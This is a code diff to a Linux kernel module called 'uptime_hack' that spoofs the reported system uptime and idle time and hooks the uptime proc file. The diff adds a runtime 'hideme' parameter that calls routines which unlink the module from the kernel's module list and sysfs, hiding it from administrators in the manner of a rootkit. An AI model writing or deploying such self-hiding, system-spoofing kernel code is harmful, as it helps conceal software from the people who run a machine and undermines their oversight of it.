@@ -45,16 +45,16 @@
 #include <asm/cputime.h>
 
 #define MODULE_VERS "1.4"
-#define MODULE_NAME "uptime"
+#define MODULE_NAME "uptime_hack"
 #define PROCFS_NAME "uptime"
 
 static long unsigned uptime = 0;
 static long unsigned idletime = 0;
 static long unsigned startjiffies = 0;
 
-static short proc_failed = 0;
-static short hideme = 0;
-static short module_hidden = 0;
+static char proc_failed = 0;
+static char hideme = 0;
+static char module_hidden = 0;
 
 static int (*old_uptime_proc_open)(struct inode *inode, struct file *file);
 static int uptime_proc_open(struct inode *inode, struct file *file);
@@ -68,9 +68,17 @@ static struct file_operations *proc_root_fops;
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
 
+static int param_kmod_hide(const char *, struct kernel_param *);
+
 module_param(uptime, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(uptime, "Sets Linux uptime to this amount of jiffies");
+
 module_param(idletime, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
-module_param(hideme, short, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(idletime, "Sets Linux idletime to this amount of jiffies");
+
+module_param_call(hideme, param_kmod_hide, param_get_bool, &hideme, S_IRUSR |
+		S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(hideme, "LKM is hidden (y/n, default n)");
 
 static void set_addr_rw(void *addr)
 {
@@ -98,6 +106,10 @@ void module_hide(void)
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 	module_hidden = 1;
+
+#ifdef DEBUG
+	printk(KERN_INFO "%s: hiding LKM\n", MODULE_NAME);
+#endif
 }
 
 void module_show(void)
@@ -106,13 +118,40 @@ void module_show(void)
 		return;
 
 	list_add(&THIS_MODULE->list, module_previous);
-	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
+	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
+			MODULE_NAME);
 	module_hidden = 0;
+
+#ifdef DEBUG
+	printk(KERN_INFO "%s: unhiding LKM\n", MODULE_NAME);
+#endif
+}
+
+static int param_kmod_hide(const char *val, struct kernel_param *kp)
+{
+	int ret;
+
+	ret = param_set_bool(val, kp);
+	if (ret)
+	{
+#ifdef DEBUG
+		printk(KERN_ALERT "%s error: could not parse LKM hideme parameters\n",
+				MODULE_NAME);
+#endif
+		return ret;
+	}
+
+	if (hideme)
+		module_hide();
+	else
+		module_show();
+
+	return 0;
 }
 
 static void proc_init(void)
 {
-	uptime_proc_file = create_proc_entry("temp_hack", 0, NULL);
+	uptime_proc_file = create_proc_entry(MODULE_NAME, 0, NULL);
 	if (uptime_proc_file == NULL)
 	{
 #ifdef DEBUG
